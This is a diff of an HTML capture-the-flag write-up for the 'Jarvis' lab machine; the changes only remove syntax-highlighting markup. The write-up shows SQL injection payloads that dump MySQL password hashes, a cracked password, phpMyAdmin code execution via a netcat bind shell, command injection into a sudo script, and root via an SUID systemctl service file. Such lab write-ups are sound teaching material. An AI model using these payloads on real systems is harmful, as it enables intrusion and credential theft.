@@ -13,64 +13,64 @@
 		<main>
 			<h1>Jarvis</h1>
 <p>As always, run an nmap scan:</p>
-<div class="codehilite"><pre><span></span><span class="err"> $ nmap -A 10.10.10.135</span>
-<span class="err">    PORT   STATE SERVICE VERSION</span>
-<span class="err">    22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span>
-<span class="err">    80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span>
-<span class="err">    |_http-title: Stark Hotel</span>
+<div class="codehilite"><pre><span></span> $ nmap -A 10.10.10.135
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+    80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+    |_http-title: Stark Hotel
 </pre></div>
 
 
 <p>(trimmed)</p>
 <p>Looking at the web server available, it's a simple listing page for a hotel. When you click a room, it takes you to <code>/room.php?cod=x</code> where x is presumably the room ID.</p>
 <p>If you replace x with a string or an invalid id, the same page returns but all fields are blank. You can do a quick test for SQL injection with the following request:</p>
-<div class="codehilite"><pre><span></span><span class="err">GET /room.php?cod=999 OR 1=1;#</span>
+<div class="codehilite"><pre><span></span>GET /room.php?cod=999 OR 1=1;#
 </pre></div>
 
 
 <p>999 is an invalid ID (we assume), but we still get a room returned and shown to us, meaning this is vulnerable.</p>
 <p>Since we're shown whatever the first row returned is, a <code>UNION select</code> should let us view any data we want with the right conditions. First, we need to match up the right amount of columns.</p>
-<div class="codehilite"><pre><span></span><span class="err">GET /room.php?cod=999 UNION SELECT 1,1,1,1; #</span>
-<span class="err">GET /room.php?cod=999 UNION SELECT 1,1,1,1,1; #</span>
-<span class="err">GET /room.php?cod=999 UNION SELECT 1,1,1,1,1,1; #</span>
-<span class="err">GET /room.php?cod=999 UNION SELECT 1,1,1,1,1,1,1; #</span>
-<span class="err">^^^ this one works</span>
+<div class="codehilite"><pre><span></span>GET /room.php?cod=999 UNION SELECT 1,1,1,1; #
+GET /room.php?cod=999 UNION SELECT 1,1,1,1,1; #
+GET /room.php?cod=999 UNION SELECT 1,1,1,1,1,1; #
+GET /room.php?cod=999 UNION SELECT 1,1,1,1,1,1,1; #
+^^^ this one works
 </pre></div>
 
 
 <p>We get a similar page, but the price, name etc is all 1. Let's start by enumerating the databases:</p>
-<div class="codehilite"><pre><span></span><span class="err">GET /room.php?cod=0 UNION SELECT 1,GROUP_CONCAT(schema_name),1,1,1,1,1 FROM information_schema.schemata; #</span>
+<div class="codehilite"><pre><span></span>GET /room.php?cod=0 UNION SELECT 1,GROUP_CONCAT(schema_name),1,1,1,1,1 FROM information_schema.schemata; #
 </pre></div>
 
 
 <p>For me, this set the name of the room to <code>aaa,hotel,information_schema,mysql,performance_schema</code>. We miss the first column because the id isn't directly visible in our page, and though it is reflected back at us through the image URL, it's easier to have it shown directly. <code>aaa</code> is a weird name, so it's probably someone else and not part of the box. It's safe to say the <code>hotel</code> database drives this website.</p>
 <p>We can now start to look at the tables in our database:</p>
-<div class="codehilite"><pre><span></span><span class="err">GET /room.php?cod=0 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),1,1,1,1,1 FROM information_schema.tables; #</span>
+<div class="codehilite"><pre><span></span>GET /room.php?cod=0 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),1,1,1,1,1 FROM information_schema.tables; #
 </pre></div>
 
 
 <p>This gives us <code>room,ALL_PLUGINS,APPLICABLE_ROLES,CHARACTER_SETS...</code>. So it looks like our database is just the one table and then the default mysql stuff.</p>
 <p>What might be more useful though, is some credentials. We can access the <code>mysql.users</code> table just like any other, and dump the first username and password hash:</p>
-<div class="codehilite"><pre><span></span><span class="err">GET /room.php?cod=0 UNION SELECT 1,User,Password,1,1,1,1 FROM mysql.user; #</span>
+<div class="codehilite"><pre><span></span>GET /room.php?cod=0 UNION SELECT 1,User,Password,1,1,1,1 FROM mysql.user; #
 </pre></div>
 
 
 <p>All this could've been done much more easily using <code>sqlmap</code>, but it's good to do it yourself sometimes. From this, we get something we can throw into john, or any other tool:</p>
-<div class="codehilite"><pre><span></span><span class="c">DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0</span>
+<div class="codehilite"><pre><span></span>DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
 </pre></div>
 
 
-<div class="codehilite"><pre><span></span> <span class="err">$</span> <span class="n">john</span> <span class="n">passwd</span>
-    <span class="n">Loaded</span> <span class="mi">1</span> <span class="n">password</span> <span class="n">hash</span> <span class="p">(</span><span class="n">mysql</span><span class="o">-</span><span class="n">sha1</span><span class="p">,</span> <span class="n">MySQL</span> <span class="mi">4</span><span class="p">.</span><span class="mi">1</span><span class="o">+</span> <span class="p">[</span><span class="n">SHA1</span> <span class="mi">128</span><span class="o">/</span><span class="mi">128</span> <span class="n">SSE2</span> <span class="mi">4</span><span class="n">x</span><span class="p">])</span>
-    <span class="n">Proceeding</span> <span class="k">with</span> <span class="n">single</span><span class="p">,</span> <span class="n">rules</span><span class="p">:</span><span class="n">Single</span>
-    <span class="n">Press</span> <span class="s1">&#39;q&#39;</span> <span class="k">or</span> <span class="n">Ctrl</span><span class="o">-</span><span class="k">C</span> <span class="k">to</span> <span class="k">abort</span><span class="p">,</span> <span class="n">almost</span> <span class="k">any</span> <span class="n">other</span> <span class="k">key</span> <span class="k">for</span> <span class="n">status</span>
-    <span class="n">Proceeding</span> <span class="k">with</span> <span class="n">wordlist</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">share</span><span class="o">/</span><span class="n">john</span><span class="o">/</span><span class="n">password</span><span class="p">.</span><span class="n">lst</span><span class="p">,</span> <span class="n">rules</span><span class="p">:</span><span class="n">Wordlist</span>
+<div class="codehilite"><pre><span></span> $ john passwd
+    Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 128/128 SSE2 4x])
+    Proceeding with single, rules:Single
+    Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+    Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
 
-    <span class="n">imissyou</span>         <span class="p">(</span><span class="n">DBadmin</span><span class="p">)</span>
+    imissyou         (DBadmin)
 
-    <span class="mi">1</span><span class="k">g</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="n">DONE</span> <span class="mi">2</span><span class="o">/</span><span class="mi">3</span> <span class="p">(</span><span class="mi">2019</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">14</span> <span class="mi">20</span><span class="p">:</span><span class="mi">50</span><span class="p">)</span> <span class="mi">1</span><span class="p">.</span><span class="mi">960</span><span class="k">g</span><span class="o">/</span><span class="n">s</span> <span class="mi">6617</span><span class="n">p</span><span class="o">/</span><span class="n">s</span> <span class="mi">6617</span><span class="k">c</span><span class="o">/</span><span class="n">s</span> <span class="mi">6617</span><span class="k">C</span><span class="o">/</span><span class="n">s</span> <span class="n">twilight</span><span class="p">..</span><span class="n">ashlee</span>
-    <span class="n">Use</span> <span class="n">the</span> <span class="ss">&quot;--show&quot;</span> <span class="k">option</span> <span class="k">to</span> <span class="n">display</span> <span class="k">all</span> <span class="k">of</span> <span class="n">the</span> <span class="n">cracked</span> <span class="n">passwords</span> <span class="n">reliably</span>
-    <span class="k">Session</span> <span class="n">completed</span>
+    1g 0:00:00:00 DONE 2/3 (2019-09-14 20:50) 1.960g/s 6617p/s 6617c/s 6617C/s twilight..ashlee
+    Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+    Session completed
 </pre></div>
 
 
@@ -78,32 +78,32 @@
 <p>For context, the hash is in a format particular to MySql &gt; 4.1, with the * being used to specify that it's a newer version.</p>
 <p>Now what? Well, whether you run dirb on the web root or just guess you should quickly find the phpMyAdmin installation which we can now access.</p>
 <p>Now we need to get actual code execution. From the phpMyAdmin root, you can find a <code>README.md</code> file which states that it's running version 4.8.0. We can easily search for exploits and find <a href="https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/">this</a> very well written guide. We could make a metasploit payload, and in most real-world situations we'd need to, but we can also try a much simpler approach:</p>
-<div class="codehilite"><pre><span></span><span class="nx">select</span> <span class="s2">&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;nc -lvp 4444 -e /bin/bash&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="s2">&quot;</span>
+<div class="codehilite"><pre><span></span>select &quot;&lt;?php echo exec(&#39;nc -lvp 4444 -e /bin/bash&#39;); ?&gt;&quot;
 </pre></div>
 
 
 <p>This will create a bash shell bound to port 4444. Run it and sure enough, we can connect.</p>
-<div class="codehilite"><pre><span></span><span class="err"> $ whoami</span>
-<span class="err">    www-data</span>
-<span class="err"> $ cat /etc/passwd</span>
-<span class="err">    root:x:0:0:root:/root:/bin/bash</span>
-<span class="err">    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
-<span class="err">    pepper:x:1000:1000:,,,:/home/pepper:/bin/bash</span>
-<span class="err">    (trimmed)</span>
+<div class="codehilite"><pre><span></span> $ whoami
+    www-data
+ $ cat /etc/passwd
+    root:x:0:0:root:/root:/bin/bash
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+    pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
+    (trimmed)
 </pre></div>
 
 
 <p>So while we have <em>a</em> shell, it's likely pepper is the real user target. Let's do our normal enum of processes:</p>
-<div class="codehilite"><pre><span></span><span class="err"> $ ps -aux</span>
-<span class="err">    USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span>
-<span class="err">    root          1  0.2  0.6 138984  6820 ?        Ss   15:39   0:08 /sbin/init</span>
-<span class="err">    root        562  0.0  2.5 271396 25648 ?        Ss   15:39   0:00 /usr/sbin/apache2 -k start</span>
-<span class="err">    www-data    917  0.0  0.3  18228  3376 pts/0    Ss+  15:45   0:00 /bin/bash</span>
-<span class="err">    root       1027  0.0  0.3  47608  3204 ?        S    16:02   0:00 sudo -u pepper /var/www/Admin-Utilities/simpler.py -p</span>
-<span class="err">    pepper     1028  0.0  0.9  26040  9128 ?        S    16:02   0:00 python3 /var/www/Admin-Utilities/simpler.py -p</span>
-<span class="err">    www-data   2203  0.0  0.0   4276   768 ?        S    16:26   0:00 sh -c nc -lvp 4444 -e /bin/bash</span>
-<span class="err">    www-data   2204  0.0  0.2  17940  2840 ?        S    16:26   0:00 bash</span>
-<span class="err">    www-data   2312  0.0  0.2  36632  2856 ?        R    16:27   0:00 ps -aux</span>
+<div class="codehilite"><pre><span></span> $ ps -aux
+    USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+    root          1  0.2  0.6 138984  6820 ?        Ss   15:39   0:08 /sbin/init
+    root        562  0.0  2.5 271396 25648 ?        Ss   15:39   0:00 /usr/sbin/apache2 -k start
+    www-data    917  0.0  0.3  18228  3376 pts/0    Ss+  15:45   0:00 /bin/bash
+    root       1027  0.0  0.3  47608  3204 ?        S    16:02   0:00 sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+    pepper     1028  0.0  0.9  26040  9128 ?        S    16:02   0:00 python3 /var/www/Admin-Utilities/simpler.py -p
+    www-data   2203  0.0  0.0   4276   768 ?        S    16:26   0:00 sh -c nc -lvp 4444 -e /bin/bash
+    www-data   2204  0.0  0.2  17940  2840 ?        S    16:26   0:00 bash
+    www-data   2312  0.0  0.2  36632  2856 ?        R    16:27   0:00 ps -aux
 </pre></div>
 
 
@@ -262,46 +262,46 @@
 
 <p>We see the -p flag, which our sudo process was using, passes input to a command. Whilst it may filter out some characters, it's still vulnerable to command injection.</p>
 <p>We setup a simple bind shell as <code>/tmp/mal.sh</code>:</p>
-<div class="codehilite"><pre><span></span><span class="err">nc -lvp 5555 -e /bin/bash</span>
+<div class="codehilite"><pre><span></span>nc -lvp 5555 -e /bin/bash
 </pre></div>
 
 
-<div class="codehilite"><pre><span></span><span class="err"> $ sudo -u pepper python ./simpler.py -p</span>
-<span class="err">    Enter an IP: $(/tmp/mal.sh)</span>
-<span class="err">    &lt;hangs&gt;</span>
+<div class="codehilite"><pre><span></span> $ sudo -u pepper python ./simpler.py -p
+    Enter an IP: $(/tmp/mal.sh)
+    &lt;hangs&gt;
 </pre></div>
 
 
 <p>Now we can connect to port 5555 and login as pepper, giving us our user flag. </p>
 <p>Next, I added my ssh key to <code>~/.ssh/authorized_keys</code> to give me a proper SSH session, meaning editors, etc will work.</p>
 <p>We've already looked through the processes before so it's unlikely to help us, we can look for SID bits though:</p>
-<div class="codehilite"><pre><span></span><span class="err"> $ find / -perm -4000 -print 2&gt; /dev/null</span>
-<span class="err">    /bin/fusermount</span>
-<span class="err">    /bin/mount</span>
-<span class="err">    /bin/ping</span>
-<span class="err">    /bin/systemctl</span>
-<span class="err">    /bin/umount</span>
-<span class="err">    /bin/su</span>
-<span class="err">    /usr/bin/newgrp</span>
-<span class="err">    /usr/bin/passwd</span>
-<span class="err">    /usr/bin/gpasswd</span>
-<span class="err">    /usr/bin/chsh</span>
-<span class="err">    /usr/bin/sudo</span>
-<span class="err">    /usr/bin/chfn</span>
-<span class="err">    /usr/lib/eject/dmcrypt-get-device</span>
-<span class="err">    /usr/lib/openssh/ssh-keysign</span>
-<span class="err">    /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+<div class="codehilite"><pre><span></span> $ find / -perm -4000 -print 2&gt; /dev/null
+    /bin/fusermount
+    /bin/mount
+    /bin/ping
+    /bin/systemctl
+    /bin/umount
+    /bin/su
+    /usr/bin/newgrp
+    /usr/bin/passwd
+    /usr/bin/gpasswd
+    /usr/bin/chsh
+    /usr/bin/sudo
+    /usr/bin/chfn
+    /usr/lib/eject/dmcrypt-get-device
+    /usr/lib/openssh/ssh-keysign
+    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 </pre></div>
 
 
 <p>The only odd one we see here is systemctl. This is used to control the systemd init system, which handles starting almost everything on the system, including managing long-running daemons.
 Giving it an SUID bit means that anyone can control all parts of the init system. This gives us an easy path to root: We make a .service file that gives us a shell, then link it and ask systemctl to run it as a system process, ie as root:</p>
-<div class="codehilite"><pre><span></span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">mal</span><span class="p">.</span><span class="n">service</span><span class="w"></span>
-<span class="w">    </span><span class="o">[</span><span class="n">Service</span><span class="o">]</span><span class="w"></span>
-<span class="w">    </span><span class="n">ExecStart</span><span class="o">=/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="ss">&quot;nc -lvp 6666 -e /bin/bash&quot;</span><span class="w"></span>
-<span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="n">systemctl</span><span class="w"> </span><span class="n">link</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pepper</span><span class="o">/</span><span class="n">mal</span><span class="p">.</span><span class="n">service</span><span class="w"></span>
-<span class="w">    </span><span class="n">Created</span><span class="w"> </span><span class="n">symlink</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="k">system</span><span class="o">/</span><span class="n">mal</span><span class="p">.</span><span class="n">service</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pepper</span><span class="o">/</span><span class="n">mal</span><span class="p">.</span><span class="n">service</span><span class="p">.</span><span class="w"></span>
-<span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="n">systemctl</span><span class="w"> </span><span class="k">start</span><span class="w"> </span><span class="n">mal</span><span class="p">.</span><span class="n">service</span><span class="w"></span>
+<div class="codehilite"><pre><span></span> $ cat mal.service
+    [Service]
+    ExecStart=/bin/bash -c &quot;nc -lvp 6666 -e /bin/bash&quot;
+ $ systemctl link /home/pepper/mal.service
+    Created symlink /etc/systemd/system/mal.service → /home/pepper/mal.service.
+ $ systemctl start mal.service
 </pre></div>
 
 
